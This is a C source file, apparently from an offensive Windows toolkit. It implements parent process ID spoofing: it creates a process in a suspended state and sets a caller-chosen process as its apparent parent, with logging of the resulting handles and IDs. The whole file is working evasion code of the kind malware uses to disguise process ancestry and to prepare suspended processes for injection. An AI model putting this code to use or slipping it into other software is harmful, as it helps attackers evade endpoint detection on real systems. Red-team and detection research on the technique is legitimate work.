#include "PPIDSpoof.h"

BOOL CreateSpoofedProcess
(
	_In_ LPCWSTR ProcessPath,
	_In_ HANDLE ParentHandle,
	_Out_ HANDLE* ProcessHandle,
	_Out_ HANDLE* ThreadHandle,
	_Out_ DWORD* ProcessId,
	_Out_ DWORD* ThreadId
)
{

	LPPROC_THREAD_ATTRIBUTE_LIST ThreadAttributes = { 0 };
	STARTUPINFOEXW si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	SIZE_T BufferSize = 0;

	RtlSecureZeroMemory(&si, sizeof(STARTUPINFOEXW));
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.StartupInfo.cb = sizeof(STARTUPINFOEXW);

	InitializeProcThreadAttributeList(NULL, 1, 0, &BufferSize);

	if (!(ThreadAttributes = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BufferSize)))
	{
		WARN("Failed to Allocate %zu Bytes to Thread Attributes!", BufferSize);
		PRINT_ERROR("HeapAlloc");
		return FALSE;
	}

	if (!InitializeProcThreadAttributeList(ThreadAttributes, 1, 0, &BufferSize))
	{
		WARN("Failed To Initialize Proc Thread Attributes!");
		PRINT_ERROR("InitializeProcThreadAttributes");
		return FALSE;
	}

	if (!UpdateProcThreadAttribute(ThreadAttributes, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentHandle, sizeof(HANDLE), NULL, NULL))
	{
		WARN("Failed To Update Proc Thread Attributes!");
		PRINT_ERROR("UpdateProcThreadAttributes");
		return FALSE;
	}

	si.lpAttributeList = ThreadAttributes;

	if (!CreateProcessW(ProcessPath, NULL, NULL, NULL, FALSE, (CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT), NULL, NULL, &si.StartupInfo, &pi))
	{
		WARN("Failed To Create New Process: %ls", ProcessPath);
		PRINT_ERROR("CreateProcessW");
		return FALSE;
	}

	INFO("Process Created: %ls", ProcessPath);

	INFO("[0x%p] Process Handle", pi.hProcess);
	INFO("\t\t\t\\___ [%ld] ProcessId", pi.dwProcessId);
	INFO("[0x%p] Thread Handle", pi.hThread);
	INFO("\t\t\t\\___ [%ld] ThreadId", pi.dwThreadId);

	*ProcessHandle = pi.hProcess;
	*ThreadHandle = pi.hThread;
	*ProcessId = pi.dwProcessId;
	*ThreadId = pi.dwThreadId;

	DeleteProcThreadAttributeList(ThreadAttributes);
	CloseHandle(ParentHandle);

	return TRUE;

}